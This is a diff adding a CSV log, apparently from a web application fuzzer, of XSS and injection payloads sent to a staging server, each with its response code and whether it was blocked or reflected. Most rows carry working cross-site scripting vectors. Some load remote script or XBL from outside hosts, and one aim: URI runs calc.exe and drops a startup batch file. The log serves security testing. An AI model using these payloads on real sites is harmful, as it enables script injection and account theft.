@@ -1,0 +1,280 @@
+Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
+0,Original,Tue Jun 02 18:19:31 CEST 2020,POST,https://staging.itapp.eus/,200,OK,149,579,324,426,5738,,,[]
+2,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,202,579,145,426,5518,,Blocked,[XSS STYLE=xss:e/**/xpression(alert('XSS'))>]
+5,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,205,579,133,426,5519,,Blocked,"[""><script>alert('XSS')</script>]"
+4,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,208,579,149,426,5522,,Blocked,[XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>]
+3,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,222,579,145,426,5518,,Blocked,[XSS-STYLE=xss:e/**/xpression(alert('XSS'))>]
+1,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,224,579,143,426,5519,,Blocked,[</XSS STYLE=xss:expression(alert('XSS'))>]
+7,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,161,579,159,426,5531,,Blocked,[Exploit Name: A very short cross browser header injection]
+8,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,170,579,213,426,5579,,Blocked,[Exploit String: with(document)getElementsByTagName('head')[0].appendChild(createElement('script')).src='//ŋ.ws']
+10,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,170,579,145,426,5517,,Blocked,"[Exploit Tags: xss, short, header, injection]"
+9,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,174,579,234,426,5605,,Blocked,[Exploit Description: This vector shows one of the shortest possible ways to inject external JavaScript into a website's header area.]
+11,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,121,426,5493,,Blocked,[Author Name: .mario]
+13,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,171,579,140,426,5512,,Blocked,[Exploit Name: Add onclick event hadler]
+14,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,181,579,178,426,5545,,Blocked,[Exploit String: onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);]
+15,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,209,426,5581,,Blocked,[Exploit Description: This vector adds an onclick event handler to a tag and appends an obfuscated JS alert.]
+16,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,279,579,173,426,5545,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated, user interaction]"
+17,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,271,579,121,426,5493,,Blocked,[Author Name: kishor]
+19,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,179,579,147,426,5519,,Blocked,[Exploit Name: Advanced HTML injection locator]
+20,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,180,579,267,426,5555,,Blocked,[Exploit String: <s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e]
+21,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,177,426,5549,,Blocked,[Exploit Description: This vector indicates HTML injections by stroked text.]
+22,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,171,579,149,426,5521,,Blocked,"[Exploit Tags: general, html breaking, injection]"
+23,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,165,579,121,426,5493,,Blocked,[Author Name: .mario]
+25,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,186,579,136,426,5508,,Blocked,[Exploit Name: Advanced XSS Locator]
+26,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,243,426,5490,,Blocked,"[Exploit String: ';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(4)</SCRIPT>=&{}"");}alert(6);function xss(){//]"
+27,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,170,579,143,426,5515,,Blocked,[Exploit Description: Advanced XSS Locator]
+28,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,169,426,5541,,Blocked,"[Exploit Tags: general, html breaking, comment breaking, JS breaking]"
+29,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,164,579,121,426,5493,,Blocked,[Author Name: .mario]
+30,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,196,579,143,426,5515,,Blocked,[Advanced XSS Locator for title-Injections]
+31,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,157,426,5529,,Blocked,[Exploit Name: Advanced XSS Locator for title-Injections]
+32,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,169,579,258,426,5490,,Blocked,"[Exploit String: ';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}"");}]"
+33,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,236,426,5608,,Blocked,[Exploit Description: This is a modified version of the XSS Locator from ha.ckers.org especially crafted to check for title injections.]
+34,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,174,579,185,426,5557,,Blocked,"[Exploit Tags: general, html breaking, comment breaking, JS breaking, title breaking]"
+35,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,191,579,121,426,5493,,Blocked,[Author Name: .mario]
+36,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,146,579,118,426,5490,,Reflected,[aim: uri exploit]
+37,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,373,579,132,426,5504,,Blocked,[Exploit Name: aim: uri exploit]
+38,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,156,579,232,426,5495,,Blocked,"[Exploit String: aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""]"
+39,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,179,426,5551,,Blocked,[Exploit Description: This aim-uri executes the calc.exe on vulnerable systems]
+24,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,3019,579,122,265,182785,,Reflected,[Advanced XSS Locator]
+40,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,250,579,155,426,5527,,Blocked,"[Exploit Tags: URI exploits, gecko, injection, general]"
+41,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,188,579,124,426,5496,,Blocked,[Author Name: xs-sniper]
+42,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,227,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 1]
+43,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,191,579,162,426,5534,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 1]
+44,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,163,579,205,426,5597,,Blocked,[Exploit String: <div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>]
+45,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,191,579,232,426,5604,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL.]
+46,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,151,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
+47,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,131,426,5503,,Blocked,[Author Name: thespanner.co.uk]
+48,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 2]
+49,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,177,579,162,426,5534,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 2]
+50,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,165,579,169,426,5504,,Blocked,[Exploit String: <div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&]
+51,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,220,579,150,426,5465,,Blocked,[&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92]
+52,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,195,579,150,426,5465,,Blocked,[&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>]
+54,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,168,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
+53,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,196,579,294,426,5666,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. All important characters are obfuscated by unclosed entities.]
+56,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,164,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 3]
+55,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,172,579,131,426,5520,,Blocked,[Author Name: thespanner.co.uk]
+58,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,213,426,5497,,Blocked,[Exploit String: <Q%^&*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>]
+57,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,154,579,162,426,5534,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 3]
+59,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,163,579,308,426,5547,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. As we can see gecko based browsers accept various characters as valid tags.]
+60,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
+61,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,162,579,131,426,5503,,Blocked,[Author Name: thespanner.co.uk]
+62,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,160,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 4]
+63,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,162,579,162,426,5497,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 4]
+64,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,168,579,216,426,5497,,Blocked,[Exploit String: <div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>]
+65,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,203,579,301,426,5673,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Furthermore unclosed NBSP entities are used to obfuscate the string.]
+66,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,226,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
+67,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,131,426,5503,,Blocked,[Author Name: thespanner.co.uk]
+68,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 5]
+69,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,162,426,5534,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 5]
+70,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,146,579,287,426,5715,,Blocked,[Exploit String: <x/style=-m\0o\0z\0-b\0i\0nd\0i\0n\0g\0:\0u\0r\0l\0(\0/\0/b\0u\0s\0i\0ne\0s\0s\0i\0nf\0o\0.c\0o\0.\0u\0k\0/\0la\0b\0s\0/\0x\0b\0l\0/\0x\0b\0l\0.\0x\0m\0l\0#\0x\0s\0s\0)>]
+71,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,173,579,312,426,5547,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Between any character of the original payload null bytes are used to obfuscate.]
+72,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,162,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
+73,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,131,426,5503,,Blocked,[Author Name: thespanner.co.uk]
+75,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,166,579,120,426,5492,,Blocked,[Exploit Name: BASE]
+76,Fuzzed,Tue Jun 02 18:23:02 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,158,426,5527,,Blocked,"[Exploit String: <BASE HREF=""javascript:alert('XSS');//"">]"
+77,Fuzzed,Tue Jun 02 18:23:02 CEST 2020,POST,https://staging.itapp.eus/,200,OK,216,579,585,426,5956,,Blocked,"[Exploit Description: Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like ”images/image.jpg” rather than full paths.  If the path includes a leading forward slash like ”/images/image.jpg” you can remove one slash from this vector (as long as there are two to begin the comment this will work]"
+78,Fuzzed,Tue Jun 02 18:23:02 CEST 2020,POST,https://staging.itapp.eus/,200,OK,160,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
+79,Fuzzed,Tue Jun 02 18:23:02 CEST 2020,POST,https://staging.itapp.eus/,200,OK,180,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
+12,Fuzzed,Tue Jun 02 18:23:15 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,6954,579,126,265,230792,,Reflected,[Add onclick event hadler]
+81,Fuzzed,Tue Jun 02 18:23:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,236,579,151,426,5523,,Blocked,[Exploit Name: Basic back ticked attribute breaker]
+82,Fuzzed,Tue Jun 02 18:23:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,256,579,146,426,5533,,Blocked,[Exploit String: `> <script>alert(5)</script>]
+83,Fuzzed,Tue Jun 02 18:23:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,264,579,165,426,5537,,Blocked,[Exploit Description: This vector breaks back ticked attributes.]
+84,Fuzzed,Tue Jun 02 18:23:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,213,579,145,426,5517,,Blocked,"[Exploit Tags: general, html breaking, basic]"
+85,Fuzzed,Tue Jun 02 18:23:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,284,579,121,426,5493,,Blocked,[Author Name: kishor]
+89,Fuzzed,Tue Jun 02 18:24:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,436,579,189,172,332,,,[Exploit Description: This vector breaks double quoted attributes and produces an alert.]
+86,Fuzzed,Tue Jun 02 18:23:43 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,19025,579,139,172,332,,,[Basic double quoted attribute breaker]
+88,Fuzzed,Tue Jun 02 18:23:55 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,6868,579,145,172,332,,,[Exploit String: > <script>alert(4)</script>]
+87,Fuzzed,Tue Jun 02 18:23:55 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,7292,579,153,172,332,,,[Exploit Name: Basic double quoted attribute breaker]
+80,Fuzzed,Tue Jun 02 18:23:42 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,19459,579,137,172,332,,,[Basic back ticked attribute breaker]
+91,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9124,579,121,172,332,,,[Author Name: kishor]
+90,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,138,172,332,,,"[Exploit Tags: general, html breaking]"
+92,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,118,172,332,,,[Basic JS breaker]
+93,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9126,579,132,172,332,,,[Exploit Name: Basic JS breaker]
+94,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,139,172,332,,,[Exploit String: xyz onerror=alert(6);]
+97,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9121,579,121,172,332,,,[Author Name: kishor]
+95,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,185,172,332,,,[Exploit Description: This vector just fits between script tags and fires an alerts.]
+96,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9122,579,143,172,332,,,"[Exploit Tags: general, JS breaking, basic]"
+98,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9126,579,128,172,332,,,[Basic JS breaker variant 1]
+99,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,142,172,332,,,[Exploit Name: Basic JS breaker variant 1]
+102,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,155,172,332,,,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
+101,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,165,172,332,,,[Exploit Description: This vector breaks JS integer assignments.]
+100,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9128,579,152,172,332,,,[Exploit String: 1;a=eval;b=alert;a(b(/c/.source));]
+104,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,128,172,332,,,[Basic JS breaker variant 2]
+103,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9127,579,121,172,332,,,[Author Name: kishor]
+109,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3662,579,121,426,5493,,Blocked,[Author Name: kishor]
+108,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3667,579,155,426,5527,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
+107,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3668,579,175,426,5547,,Blocked,[Exploit Description: This vector breaks JS integer assignments in arrays.]
+106,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3674,579,147,426,5547,,Blocked,[Exploit String: 1];a=eval;b=alert;a(b(17));//]
+113,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,220,579,181,426,5553,,Blocked,[Exploit Description: This vector breaks JS when placed in double quoted arrays.]
+105,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3898,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 2]
+112,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,227,579,146,426,5491,,Blocked,[Exploit String: ];a=eval;b=alert;a(b(16));//]
+114,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,246,579,136,426,5508,,Blocked,"[Exploit Tags: general, JS breaking]"
+115,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,245,579,121,426,5493,,Blocked,[Author Name: kishor]
+118,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,133,579,147,426,5491,,Blocked,[Exploit String: '];a=eval;b=alert;a(b(15));//]
+117,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 4]
+120,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,133,579,155,426,5527,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
+119,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,139,579,183,426,5555,,Blocked,[Exploit Description: This vector breaks JS when embedded in single quoted arrays.]
+121,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,146,579,121,426,5493,,Blocked,[Author Name: kishor]
+123,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 5]
+124,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,134,579,147,426,5492,,Blocked,[Exploit String: 1};a=eval;b=alert;a(b(14));//]
+125,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,172,426,5544,,Blocked,[Exploit Description: JS literal object breaker for integer properties.]
+126,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,155,426,5527,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
+127,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,121,426,5493,,Blocked,[Author Name: kishor]
+122,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,2212,579,128,265,228075,,Reflected,[Basic JS breaker variant 5]
+116,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,2733,579,128,265,228075,,Reflected,[Basic JS breaker variant 4]
+110,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,2973,579,128,265,228075,,Reflected,[Basic JS breaker variant 3]
+129,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,147,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 6]
+130,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,155,579,147,426,5491,,Blocked,[Exploit String: '};a=eval;b=alert;a(b(13));//]
+131,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,178,579,191,426,5563,,Blocked,[Exploit Description: JS breaker for literal objects with single quoted string properties.]
+132,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,149,579,155,426,5493,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
+133,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,121,426,5493,,Blocked,[Author Name: kishor]
+136,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,142,579,146,426,5491,,Blocked,[Exploit String: };a=eval;b=alert;a(b(12));//]
+135,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,189,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 7]
+137,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,247,579,191,426,5563,,Blocked,[Exploit Description: JS breaker for literal objects with double quoted string properties.]
+138,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,232,579,136,426,5508,,Blocked,"[Exploit Tags: general, JS breaking]"
+139,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,149,579,121,426,5493,,Blocked,[Author Name: kishor]
+141,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,177,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 8]
+142,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,177,579,148,426,5493,,Blocked,[Exploit String: a=1;a=eval;b=alert;a(b(11));//]
+143,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,331,579,168,426,5540,,Blocked,[Exploit Description: Can be used when JS can be injected directly.]
+144,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,218,579,155,426,5527,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
+145,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,121,426,5493,,Blocked,[Author Name: kishor]
+128,Fuzzed,Tue Jun 02 18:24:35 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,3306,579,128,265,230742,,Reflected,[Basic JS breaker variant 6]
+147,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,180,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 9]
+148,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,163,579,150,426,5490,,Blocked,[Exploit String: ;//%0da=eval;b=alert;a(b(10));//]
+149,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,263,579,209,426,5581,,Blocked,"[Exploit Description: Breaks double quoted strings, injects a comment, carriage return and finally an alert.]"
+150,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,161,579,142,426,5514,,Blocked,"[Exploit Tags: general, JS breaking, CRLF]"
+151,Fuzzed,Tue Jun 02 18:24:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,192,579,121,426,5493,,Blocked,[Author Name: kishor]
+111,Fuzzed,Tue Jun 02 18:24:53 CEST 2020,POST,https://staging.itapp.eus/,200,OK,400,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 3]
+153,Fuzzed,Tue Jun 02 18:24:53 CEST 2020,POST,https://staging.itapp.eus/,200,OK,180,579,143,426,5515,,Blocked,[Exploit Name: Basic JS breaker variant 10]
+154,Fuzzed,Tue Jun 02 18:24:53 CEST 2020,POST,https://staging.itapp.eus/,200,OK,187,579,150,426,5490,,Blocked,[Exploit String: ';//%0da=eval;b=alert;a(b(9));//]
